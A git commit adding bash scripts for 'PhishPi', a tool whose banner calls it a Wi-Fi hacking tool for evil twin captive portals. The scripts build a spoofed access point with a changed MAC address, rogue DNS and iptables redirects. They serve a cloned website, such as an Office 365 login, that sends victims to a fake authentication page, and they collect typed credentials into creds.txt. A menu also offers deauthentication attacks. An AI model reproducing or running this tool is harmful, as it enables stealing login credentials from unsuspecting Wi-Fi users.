3b31026d035840abc08946584bf6eb9005084d4f
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-05-26 08:36:19 -0400

    Add files via upload

---
+++ PhishPi/0365_Captive.sh
@@ -0,0 +1,114 @@
+#!/bin/bash/
+echo -e ${green}"Which interface do you want to use as your AP NIC? Example: wlan1"${clear}
+echo ""
+read AP
+echo""
+echo -e ${yellow}"Using $AP as your AP interface"${clear}
+echo ""
+sleep 1
+echo -e ${green}"What is the Wifi network you want to spoof? Example: Starbucks Corporate Wifi"${clear}
+echo ""
+read SSID
+sleep 1
+echo ""
+echo -e ${yellow}"Using $SSID as your spoofed network"${clear}
+sleep 1
+echo ""
+echo -e ${green}"What is the domain you want to spoof on your network? Example: starbucks.com"${clear}
+echo ""
+read domain
+echo ""
+sleep 1
+echo -e ${yellow}"Using $domain as your spoofed domain"${clear}
+sleep 1
+echo ""
+echo -e ${green}"Enter Website URL To Clone. Example: https://www.starbucks.com"${clear}
+echo ""
+read URL
+echo ""
+echo -e ${yellow}"Cloning $URL"${clear}
+echo ""
+systemctl stop dnsmasq
+/usr/bin/chromium-browser --no-sandbox 2>/dev/null
+runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html
+echo ""
+echo ${yellow}"Cloning finished"${clear}
+echo ""
+echo -e ${yellow}"$URL Cloned Successfully"${clear}
+sleep 2
+
+#Copying Resources
+
+cp Resources/hosts . 2>/dev/null
+cp Resources/dnsmasq.conf . 2>/dev/null
+cp Resources/hostapd.conf . 2>/dev/null
+cp Resources/index.html . 2>/dev/null
+cp Resources/authenticate.html . 2>/dev/null
+cp Resources/post.php . 2>/dev/null
+
+#Replacing Variables In Files
+sed -i "s/domain/${domain}g/" post.php
+sed -i "s/domain/${domain}/g" index.html
+sed -i "s/10.1.1.1/${domain}/g" dnsmasq.conf
+sed -i "s/AP/${AP}/g" hostapd.conf
+sed -i "s/SSID/${SSID}/g" hostapd.conf
+sed -i "s/domain/${domain}/g" authenticate.html
+sed -i "s/domain/${domain}/g" hosts
+
+#Replaceing Resources
+rm /etc/hostapd/hostapd.conf 2>/dev/null
+mv hostapd.conf /etc/hostapd/hostapd.conf
+mv index.html /var/www/html/redirect/
+mv authenticate.html /var/www/html/
+mv post.php /var/www/html/
+mv hosts /etc/hosts
+
+echo ""
+sleep 1
+echo -e ${green}"Moving Your Index.html File Into Apache"${clear}
+echo ""
+mv /home/pi/index.html /var/www/html/index.html
+echo -e ${green}"Starting Apache"${clear}
+service apache2 start
+sleep 1
+echo ""
+echo -e ${green}"Changing $AP MAC Address"${clear}
+echo ""
+ifconfig $AP down
+macchanger -A $AP
+sleep 1
+ifconfig $AP up
+sleep 1
+echo ""
+echo -e ${green}"Configuring $AP Into An Access Point"${clear}
+echo ""
+hostapd -B /etc/hostapd/hostapd.conf
+sleep 2
+echo ""
+echo -e ${green}"Bringing Up The Bridge"${clear}
+echo ""
+ifconfig br0 up
+sleep 2
+ifconfig br0 10.1.1.1 netmask 255.255.255.0
+sysctl net.ipv4.ip_forward=1
+echo ""
+echo -e ${green}"Copying Redirect Into Cloned Page"${clear}
+echo ""
+echo "<meta http-equiv="refresh" content=2;URL='http://${domain}/authenticate.html'>">> /var/www/html/index.html
+echo -e ${green}"Setting IPTables"${clear}
+iptables --flush
+iptables -t nat --flush
+iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
+iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
+iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
+iptables -t nat -A POSTROUTING -j MASQUERADE
+sleep 2
+echo ""
+echo -e ${green}"Starting Rouge DNS"${clear}
+service dnsmasq start
+sleep 4
+echo ""
+echo -e ${red}"Access Point Should Be Up. Watch /var/www/html/creds.txt For Creds"${clear}
+echo ""
+sleep 2
+
---
+++ PhishPi/PhishPi.sh
@@ -0,0 +1,88 @@
+#!/bin/bash/
+
+NO_COLOR="\e[0m"
+WHITE="\e[0;17m"
+BOLD_WHITE="\e[1;37m"
+BLACK="\e[0;30m"
+BLUE="\e[0;34m"
+BOLD_BLUE="\e[1;34m"
+GREEN="\e[0;32m"
+BOLD_GREEN="\e[1;32m"
+CYAN="\e[0;36m"
+BOLD_CYAN="\e[1;36m"
+RED="\e[0;31m"
+BOLD_RED="\e[1;31m"
+PURPLE="\e[0;35m"
+BOLD_PURPLE="\e[1;35m"
+BROWN="\e[0;33m"
+BOLD_YELLOW="\e[1;33m"
+GRAY="\e[0;37m"
+BOLD_GRAY="\e[1;30m"
+red='\033[0;31m'
+green='\033[0;32m'
+yellow='\033[0;33m'
+blue='\033[0;34m'
+magenta='\033[0;35m'
+cyan='\033[0;36m'
+# Clear the color after that
+clear='\033[0m'
+
+function easyexit()
+{
+	clear
+	sleep 2
+	ifconfig $AP down
+	macchanger -p $AP
+	iwconfig $AP mode managed
+	ifconfig $AP up
+	clear title
+	exit
+}
+
+function title() {
+echo -e "$BOLD_GREEN
+  
+	______ _     _     _    ______ _ 
+	| ___ \ |   (_)   | |   | ___ (_)
+	| |_/ / |__  _ ___| |__ | |_/ /_ 
+	|  __/| '_ \| / __| '_ \|  __/| |
+	| |   | | | | \__ \ | | | |   | |
+	\_|   |_| |_|_|___/_| |_\_|   |_|             
+
+               **by assume-breach**
+
+  A Wifi Hacking Tool For Evil Twin Captive Portals
+
+                Use At Your Own Risk"
+}
+
+title
+echo -e $BOLD_CYAN
+echo " Choose an option:"
+echo " "
+echo -e "$BOLD_BLUE 1.$BOLD_WHITE Office 365 Domain Credential Phish"
+echo -e "$BOLD_BLUE 2.$BOLD_WHITE Clone A Single Website"
+echo -e "$BOLD_BLUE 3.$BOLD_WHITE Deauth A Wifi Network"
+echo " "
+echo -n -e "$BOLD_WHITE > "
+read CHOICE
+clear
+
+if [ $CHOICE == 1 ]; then
+	title
+	echo -e $BOLD_CYAN
+	echo ""
+	bash 0365_Captive.sh
+
+
+elif [ $CHOICE == 2 ]; then
+	bash cloner.sh
+
+elif [ $CHOICE == 3 ]; then
+        bash deauth.sh
+        title
+else 
+	echo -e $BOLD_RED Invalid option
+	sleep 3
+	trap easyexit EXIT
+fi
